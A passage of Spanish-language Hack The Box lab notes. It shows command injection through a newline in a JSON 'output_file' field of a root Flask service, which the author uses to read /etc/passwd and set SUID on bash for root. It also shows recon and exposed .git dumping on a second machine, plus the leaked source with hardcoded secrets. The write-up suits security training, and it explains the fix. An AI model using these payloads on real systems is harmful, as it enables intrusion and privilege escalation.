<br><img alt="Pasted image 20250205123032.png" src="machines/bigbang/imgs/pasted-image-20250205123032.png"><br>la variable output_file puede estar mal sanitizada  y llevarnos a rce vamos a probar<br><br>{
    "command": "send_image",
    "output_file": "test.png&amp;whoami"
}
<br>Response:<br>{"error":"Output file path contains dangerous characters"}
<br>Con \n:<br>{
    "command": "send_image",
    "output_file": "test.png\nwhoami"
}
<br>Response:<br>{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\nwhoami'"}
<br>Vemos que busca un directorio, vamos a probar a leer archivos;<br>{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../etc/passwd"

}
<br>{"error":"Error generating image: /bin/sh: 2: ../../../../../etc/passwd: Permission denied\n"}
<br>Podemos cambiar los permisos del bash<br>{
    "command": "send_image",
    "output_file": "nothing.png\n../../../../../usr/bin/chmod 777 /bin/bash"

}
<br>{"error":"Output file path contains dangerous characters"}

<br>Sin embargo desde shawking:<br>shawking@bigbang:/var$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
<br>]]></description><link>machines/bigbang/03-user-shawking.html</link><guid isPermaLink="false">Machines/BigBang/03-User-Shawking.md</guid><pubDate>Wed, 05 Feb 2025 12:23:15 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250204001637.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/bigbang/imgs/pasted-image-20250204001637.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Docker]]></title><description><![CDATA[ 
 <br><br>Vemos los recursos docker de la maquina :<br>CONTAINER ID   IMAGE                       COMMAND                  CREATED        STATUS                 PORTS                                        NAMES
de64f0959084   grafana/grafana             "/run.sh"                8 months ago   Up 2 hours             127.0.0.1:3000-&gt;3000/tcp                     grafana
bf9a078a3627   php:8.3.2-apache            "docker-php-entrypoi…"   8 months ago   Up 2 hours             0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp            apache-server
14031fdccc6a   mysql/mysql-server:latest   "/entrypoint.sh mysq…"   8 months ago   Up 2 hours (healthy)   172.17.0.1:3306-&gt;3306/tcp, 33060-33061/tcp   mysql-server

<br><br>Este es el proceso root que permite la escalada de privilegios:<br>root@bigbang:~# ps -aux

root        1751  1.0  1.8 1199704 73656 ?       Ssl  10:32   2:31 /usr/bin/python3 /root/satellite/app.py

<br>En el el directorio /root encontramos el script de  lo que parece el servidor web 9090, vemos que esta desarrollado en flask y que parece el backend que maneja la base de datos<br>root@bigbang:~# cat satellite/app.py 
from flask import Flask, request, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from io import BytesIO
from PIL import Image
import random
import datetime
import numpy as np
import subprocess

app = Flask(__name__)

# Update the following line with your MySQL database connection details
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://satellite_user:satellite_password@172.17.0.1/satellite_db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['JWT_SECRET_KEY'] = 'gUX2sShwFlHJ9MBwoXwWNghwuMenSpoi5wIL12kzXfVuNzh7G9WMysTNlnWyvvvD'

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
jwt = JWTManager(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    x = db.Column(db.Float, nullable=False)
    y = db.Column(db.Float, nullable=False)
    z = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.datetime.utcnow)

def create_tables():
    with app.app_context():
        db.create_all()

create_tables()

def contains_dangerous_chars(input_str):
    dangerous_chars = [
        ';',  # Separador de comandos
        "'",  # Comilla simple
        '"',  # Comilla doble
        '\\',  # Barra invertida
        '&amp;',  # Ejecución en paralelo
        '|',  # Pipe
        '$',  # Expansión de variables
        '(',  # Paréntesis de apertura
        ')',  # Paréntesis de cierre
        '&gt;',  # Redirección de salida
        '&lt;',  # Redirección de entrada
        '`',  # Acento grave
        '!',  # Ejecución de comandos del historial
        '+',  # Puede ser usado en algunos contextos para comandos
        '#',  # Comentarios en shell
        '*',  # Wildcard (comodín)
        '?',  # Wildcard (comodín)
        '[',  # Inicio de clase de caracteres en expresiones regulares
        ']',  # Fin de clase de caracteres en expresiones regulares
        '{',  # Inicio de bloque de comandos o parámetros en algunas shells
        '}',  # Fin de bloque de comandos o parámetros en algunas shells
        '^',  # Redirección de error en algunas shells
        '%'  # Puede tener usos especiales en algunas shells
    ]
    return any(char in input_str for char in dangerous_chars)

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username', None)
    password = request.json.get('password', None)
    if not username or not password:
        return jsonify({'error': 'Missing username or password'}), 400
    user = User.query.filter_by(username=username).first()
    if not user or not bcrypt.check_password_hash(user.password, password):
        return jsonify({'error': 'Bad username or password'}), 401
    access_token = create_access_token(identity=username, expires_delta=datetime.timedelta(hours=1))
    return jsonify(access_token=access_token), 200

@app.route('/command', methods=['POST'])
@jwt_required()
def command():
    command = request.json.get('command', '').lower()
    current_username = get_jwt_identity()

    # Retrieve the User object corresponding to the username
    current_user = User.query.filter_by(username=current_username).first()

    if not current_user:
        return jsonify({'error': 'User not found'}), 404

    if command == 'move':
        try:
            x = float(request.json.get('x'))
            y = float(request.json.get('y'))
            z = float(request.json.get('z'))
        except (TypeError, ValueError):
            return jsonify({'error': 'Invalid coordinates. Please provide numeric values for x, y, and z.'}), 400

        # Save the coordinates into the database
        location = Location(user_id=current_user.id, x=x, y=y, z=z)
        db.session.add(location)
        db.session.commit()

        return jsonify({'status': f'{current_username} is moving to coordinates ({x}, {y}, {z})'})

    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=9090)

<br>El script importa varias bibliotecas clave:<br>
<br>Flask : Para crear la aplicación web.
<br>SQLAlchemy : Para interactuar con una base de datos MySQL.
<br>Flask-Bcrypt : Para cifrar contraseñas de usuario.
<br>Flask-JWT-Extended : Para manejar tokens JWT (JSON Web Tokens) para la autenticación.
<br>Pillow (PIL) : Para manipular imágenes.
<br>Subprocess : Para ejecutar comandos externos.
<br>En esta parte del codigo podemos observar la vulnerabilidad que permite la escalada de privilegios:<br>    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')    
<br>El uso de shell=True aumenta significativamente el riesgo de inyección de comandos porque permite que el shell interprete la cadena completa.<br><br>
<br>Como se mencionó anteriormente, cualquier carácter especial en output_file puede ser interpretado como parte del comando.
<br><br>
<br>Evitar usar shell=True siempre que sea posible. En su lugar, pasar los argumentos como una lista:
<br>subprocess.run(['/usr/local/bin/image-tool', '--get-image', output_file], check=True, capture_output=True, text=True)
]]></description><link>machines/bigbang/04-post-exploit.html</link><guid isPermaLink="false">Machines/BigBang/04-Post-Exploit.md</guid><pubDate>Wed, 05 Feb 2025 14:36:58 GMT</pubDate></item><item><title><![CDATA[BigBang]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br> <img src="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 645
active:: True
name:: BigBang
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Hard
stars:: 4.0
created:: 02/05/2025
published:: 01/25/25
avatar:: /storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png
tags:: 
]]></description><link>machines/bigbang/bigbang.html</link><guid isPermaLink="false">Machines/BigBang/BigBang.md</guid><pubDate>Wed, 05 Feb 2025 15:15:21 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1 - Recon]]></title><description><![CDATA[ 
 <br>Puertos tcp abiertos nmap Syn scan<br>sudo nmap -sS -p- -T4 -Pn -n  -v cat.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 11:51 CET
Initiating SYN Stealth Scan at 11:51
Scanning cat.htb (10.10.11.53) [65535 ports]
Discovered open port 80/tcp on 10.10.11.53
Discovered open port 22/tcp on 10.10.11.53
Completed SYN Stealth Scan at 11:52, 20.10s elapsed (65535 total ports)
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
           Raw packets sent: 65943 (2.901MB) | Rcvd: 65605 (2.625MB)
<br>Puertos UDP abiertos<br>None
<br>Analisis de puertos<br>sudo nmap -sCV -p 22,80 -T4 -Pn -n -v cat.htb
ost is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
|_http-title: Best Cat Competition
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

<br><br><br><br>➜  ~ whatweb http://cat.htb:80

http://cat.htb:80 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.53], Title[Best Cat Competition]
<br>Vista principal:<br>
<img alt="Pasted image 20250206115548.png" src="machines/cat/imgs/pasted-image-20250206115548.png"><br><br>Hacemos fuzzing de subdominos a ver si encontramos alguno;<br>sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 http://FUZZ.cat.htb:80 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://FUZZ.cat.htb:80/
Total requests: 4992

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                 
=====================================================================


^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 975.6446
Processed Requests: 2657
Filtered Requests: 2657
Requests/sec.: 2.723327

<br>Ningun subdomino encontrado de momento;<br>Usamos Feroxbuster para el fuzzing de endpoints en <a rel="noopener nofollow" class="external-link" href="http://cat.htb:80" target="_blank">http://cat.htb:80</a><br>200      GET       41l       83w     1242c http://cat.htb/vote.php
200      GET      140l      327w     4004c http://cat.htb/join.php
200      GET      127l      270w     2900c http://cat.htb/css/styles.css
200      GET      196l      415w     5082c http://cat.htb/winners.php
200      GET      129l      285w     3075c http://cat.htb/
200      GET      127l      270w     2900c http://cat.htb/css/styles
200      GET      304l     1647w   132808c http://cat.htb/img/cat1
200      GET      904l     5604w   448419c http://cat.htb/img/cat2
[####################] - 2m     56163/56163   535/s   http://cat.htb/ 
[####################] - 2m     56163/56163   535/s   http://cat.htb/uploads/ 
[####################] - 2m     56163/56163   552/s   http://cat.htb/img/ 
[####################] - 2m     56163/56163   561/s   http://cat.htb/css/ 
[####################] - 2m     56163/56163   586/s   http://cat.htb/winners/    
<br><br><img alt="Pasted image 20250206120226.png" src="machines/cat/imgs/pasted-image-20250206120226.png"><br>
Si pinchamos en Already have an account? nos redirige al endpoint /join.php Pruebo a logearme:<br>
<img alt="Pasted image 20250206120341.png" src="machines/cat/imgs/pasted-image-20250206120341.png"><br>
Parece que el servidor maneja cookies de autenticacion<br>
<img alt="Pasted image 20250206120416.png" src="machines/cat/imgs/pasted-image-20250206120416.png"><br>PHPSESSID:"el281bprg2ti42m6j0htoq4bom"
<br><br>Una vez logueados parece que podemos apuntar a nuestro gato en el concurso a traves del formulario en /contest.php vamos a analizar la subida de imagenes en burp<br>
<img alt="Pasted image 20250206120536.png" src="machines/cat/imgs/pasted-image-20250206120536.png"><br>Realizamos el formulario para nuestro gato cyberpunk:<br>
<img alt="Pasted image 20250206120915.png" src="machines/cat/imgs/pasted-image-20250206120915.png"><br>
Request:<br>POST /contest.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2525655587332479862513910270
Content-Length: 125072
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/contest.php
Cookie: PHPSESSID=el281bprg2ti42m6j0htoq4bom
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_name"

GATO2
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="age"

23
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="birthdate"

2077-02-02
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="weight"

95
-----------------------------2525655587332479862513910270
Content-Disposition: form-data; name="cat_photo"; filename="image(1).png"
Content-Type: image/png

PNG


IHDR7SËöÓ7	pHYsÄÄ+ IDATxìw\GÇ½JïJ·6P{ïÝ{ï-ÄDc7±
...
<br>Response:<br>HTTP/1.1 200 OK
Date: Thu, 06 Feb 2025 11:09:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2391
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;title&gt;Contest - Best Cat Community&lt;/title&gt;
&lt;link rel="stylesheet" href="css/styles.css"&gt;
&lt;style&gt;
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%;
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%;
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;div class="navbar"&gt;
        &lt;a href="/"&gt;Home&lt;/a&gt;
        &lt;a href="/vote.php"&gt;Vote&lt;/a&gt;
        &lt;a href="/contest.php"&gt;Contest&lt;/a&gt;
        &lt;a href="/winners.php"&gt;Winners&lt;/a&gt;
        &lt;a href="/logout.php"&gt;Logout&lt;/a&gt;    &lt;/div&gt;

    &lt;div class="container"&gt;
        &lt;h1&gt;Contest - Best Cat Community&lt;/h1&gt;
                    &lt;div class="message"&gt;Cat has been successfully sent for inspection.&lt;/div&gt;
                        &lt;form method="post" enctype="multipart/form-data"&gt;
            &lt;label for="cat_name"&gt;Cat Name:&lt;/label&gt;
            &lt;input type="text" id="cat_name" name="cat_name" required&gt;
            &lt;label for="age"&gt;Cat Age:&lt;/label&gt;
            &lt;input type="number" id="age" name="age" required&gt;
            &lt;label for="birthdate"&gt;Cat Birthdate:&lt;/label&gt;
            &lt;input type="date" id="birthdate" name="birthdate" required&gt;
            &lt;label for="weight"&gt;Cat Weight (in kg):&lt;/label&gt;
            &lt;input type="number" id="weight" name="weight" step="0.01" required&gt;
            &lt;label for="cat_photo"&gt;Cat Photo:&lt;/label&gt;
            &lt;input type="file" id="cat_photo" name="cat_photo" accept="image/*" required&gt;
            &lt;input type="submit" value="Register Cat"&gt;
        &lt;/form&gt;
    &lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;



<br>Intento buscar donde se guardan las imagenes subidas al servidor; En /vote.php las 3 imagenes visibles se guardan en los siguientes endpoints:<br>http://cat.htb/img/cat3.webp
http://cat.htb/img/cat2.png
http://cat.htb/img/cat1.jpg
<br><br>He probado mil maneras de acceder a la imagen pero no parece que el servidor este guardando las imagenes con el mismo nombre que se suben o igual no en ese directorio ;  Prosigo haciendo el Recon<br><br>En el escaneo con nmap nos encuentra un repositorio de git<br>
El endpoint da forbidden.<br>
<img alt="Pasted image 20250206115612.png" src="machines/cat/imgs/pasted-image-20250206115612.png"><br>
Vamos a usar la suite de herramientas de GitTools .<br>
<a data-tooltip-position="top" aria-label="https://github.com/internetwache/GitTools.git" rel="noopener nofollow" class="external-link" href="https://github.com/internetwache/GitTools.git" target="_blank">Repositorio</a><br>➜  Dumper git:(master) ./gitdumper.sh http://cat.htb/.git/ GitCatDump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating GitCatDump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
[+] Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
[+] Downloaded: objects/64/d98c5af736de120e17eff23b17e22aad668718
[+] Downloaded: objects/31/e87489c5f8160f895e941d00087bea94f21315
[+] Downloaded: objects/0c/be0133fb00b13165bd7318e42e17f322daac7f
[+] Downloaded: objects/6f/ae98c9ae65a9ecbf37e821e7bafb48bcdac2bc
[+] Downloaded: objects/91/92afa265e9e73f533227e4f118f882615d3640
[+] Downloaded: objects/0f/fa90ae01a4f353aa2f6b2de03c212943412222
[+] Downloaded: objects/b8/7b8c6317f8e419dac2c3ce3517a6c93b235028
[+] Downloaded: objects/26/bd62c92bcf4415f2b82514bbbac83936c53cb5
[+] Downloaded: objects/38/660821153b31dbbee89396eacf974c095ab0dc
[+] Downloaded: objects/58/62718ef94b524f3e36627e6f2eae1e3570a7f4
[+] Downloaded: objects/b7/df8d295f9356332f9619ae5ecec3230a880ef2
[+] Downloaded: objects/88/12266cb97013f416c175f9a9fa08aae524c92a
[+] Downloaded: objects/cf/8166a8873d413e6afd88fa03305880e795a2c6
[+] Downloaded: objects/9a/dbf70baf0e260d84d9c8666a0460e75e8be4a8
[+] Downloaded: objects/48/21d0cd8fecc8c3579be5735b1aab69f1637c86
[+] Downloaded: objects/7b/a662bf012ce71d0db9e86c80386b7ae0a54ea1
[+] Downloaded: objects/9b/e1a76f22449a7876a712d34dc092f477169c36
[+] Downloaded: objects/09/7745b30047ab3d3e6e0c5239c2dfd5cac308a5
<br>Vamos a echar un vistazo a ver si encontramos algo interesante;<br>.git git:(master) strings index
DIRC
accept_cat.php
        admin.php
config.php
contest.php
css/styles.css
?S2'
a]6@
delete_cat.php
img/cat1.jpg
img/cat2.png
img/cat3.webp
img_winners/cat1.jpg
img_winners/cat2.png
img_winners/cat3.webp
;#P(
        index.php
join.php
logout.php
KRO&gt;6b~o.
view_cat.php
vote.php
winners.php
                        wE
&amp;winners/cat_report_20240831_173129.php
TREE
19 4
3 !2k
'dcss
&lt;!)CA""winners
=A&gt;j
img_winners
&lt;!)CA""o
t6+x
<br>Parece que encontramos algunos endpoints interesantes como delete_cat.php o view_cat.php<br><br><br>Pruebo el endpoint pero me redirige<br>
<img alt="Pasted image 20250206162924.png" src="machines/cat/imgs/pasted-image-20250206162924.png"><br><br>Este endpoint me da un 200 pero con el mensaje "access denied" puede sernos de utilidad mas tarde<br>
<img alt="Pasted image 20250206164029.png" src="machines/cat/imgs/pasted-image-20250206164029.png"><br><br>El archivo  .git/logs/HEAD es el archivo de un commit <br>0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel &lt;axel2017@gmail.com&gt; 1725146774 +0000    commit (initial): Cat v1
<br>Nos guardamos el mail como posible usuario explotable<br>Pruebo con git-dumper ya que esta anterior no me exporto todo lo que tenia que exportar; (me lo conto un pajarito)<br>(venv) ➜  DUMP git:(master) tree .
.
|-- accept_cat.php
|-- admin.php
|-- config.php
|-- contest.php
|-- css
|   `-- styles.css
|-- delete_cat.php
|-- img
|   |-- cat1.jpg
|   |-- cat2.png
|   `-- cat3.webp
|-- img_winners
|   |-- cat1.jpg
|   |-- cat2.png
|   `-- cat3.webp
|-- index.php
|-- join.php
|-- logout.php
|-- view_cat.php
|-- vote.php
|-- winners
|   `-- cat_report_20240831_173129.php
`-- winners.php
<br>Ahora ya tenemos código fuente de la pagina; vamos a ver si encontramos algún endpoint vulnerable;<br><br>Vemos a continuacion el codigo de join.php:<br>&lt;?php
session_start();

include 'config.php';

$success_message = "";
$error_message = "";

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email]);
    $existing_user = $stmt_check-&gt;fetch(PDO::FETCH_ASSOC);

    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo-&gt;prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert-&gt;execute([':username' =&gt; $username, ':email' =&gt; $email, ':password' =&gt; $password]);

        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}

// Login process
if ($_SERVER["REQUEST_METHOD"] == "GET" &amp;&amp; isset($_GET['loginForm'])) {
    $username = $_GET['loginUsername'];
    $password = md5($_GET['loginPassword']);

    $stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE username = :username");
    $stmt-&gt;execute([':username' =&gt; $username]);
    $user = $stmt-&gt;fetch(PDO::FETCH_ASSOC);

    if ($user &amp;&amp; $password === $user['password']) {
        $_SESSION['username'] = $user['username'];
        header("Location: /");
        exit();
    } else {
        $error_message = "Incorrect username or password.";
    }
}
?&gt;


&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;title&gt;Join the Best Cat Community&lt;/title&gt;
&lt;link rel="stylesheet" href="css/styles.css"&gt;
&lt;style&gt;
    .container {
        max-width: 600px;
        margin: 20px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .card {
        overflow: hidden;
        transition: height 0.3s ease-in-out;
        border: 1px solid #ccc;
        border-radius: 5px;
        margin-bottom: 40px; /* Increased margin between cards */
    }
    .card.register {
        height: 400px;
    }
    .card.login {
        height: 400px;
    }
    form {
        padding: 20px;
        box-sizing: border-box;
    }
    label,
    input {
        display: block;
        margin-bottom: 10px;
        width: 100%; /* Make inputs fill the width */
    }
    input[type="submit"] {
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 15px 20px;
        cursor: pointer;
        transition: background-color 0.3s;
        width: 100%; /* Make button fill the width */
    }
    input[type="submit"]:hover {
        background-color: #0056b3;
    }
    .toggle-link {
        text-align: center;
        margin-bottom: 20px;
    }
    .toggle-link a {
        text-decoration: none;
        color: #007bff;
        transition: color 0.3s;
    }
    .toggle-link a:hover {
        color: #0056b3;
    }
    .message {
        margin-top: 20px;
        text-align: center;
        color: green;
    }
    .error-message {
        margin-top: 20px;
        text-align: center;
        color: red;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;div class="navbar"&gt;
    &lt;a href="/"&gt;Home&lt;/a&gt;
    &lt;a href="/vote.php"&gt;Vote&lt;/a&gt;
    &lt;a href="/contest.php"&gt;Contest&lt;/a&gt;
    &lt;a href="/winners.php"&gt;Winners&lt;/a&gt;
    &lt;a href="/join.php"&gt;Join&lt;/a&gt;
&lt;/div&gt;

&lt;div class="container"&gt;
    &lt;h1&gt;Join the Best Cat Community&lt;/h1&gt;
    &lt;?php if ($success_message != ""): ?&gt;
        &lt;div class="message"&gt;&lt;?php echo $success_message; ?&gt;&lt;/div&gt;
    &lt;?php endif; ?&gt;
    &lt;?php if ($error_message != ""): ?&gt;
        &lt;div class="error-message"&gt;&lt;?php echo $error_message; ?&gt;&lt;/div&gt;
    &lt;?php endif; ?&gt;
    &lt;div class="card register"&gt;
        &lt;center&gt;&lt;h2&gt;Register&lt;/h2&gt;&lt;/center&gt;
        &lt;form id="registerForm" method="get"&gt;
            &lt;label for="username"&gt;Username:&lt;/label&gt;
            &lt;input type="text" id="username" name="username" required&gt;
            &lt;label for="email"&gt;Email:&lt;/label&gt;
            &lt;input type="email" id="email" name="email" required&gt;
            &lt;label for="password"&gt;Password:&lt;/label&gt;
            &lt;input type="password" id="password" name="password" required&gt;
            &lt;input type="submit" name="registerForm" value="Register"&gt;
        &lt;/form&gt;
    &lt;/div&gt;
    &lt;div class="card login" style="display: none;"&gt;
        &lt;center&gt;&lt;h2&gt;Login&lt;/h2&gt;&lt;/center&gt;
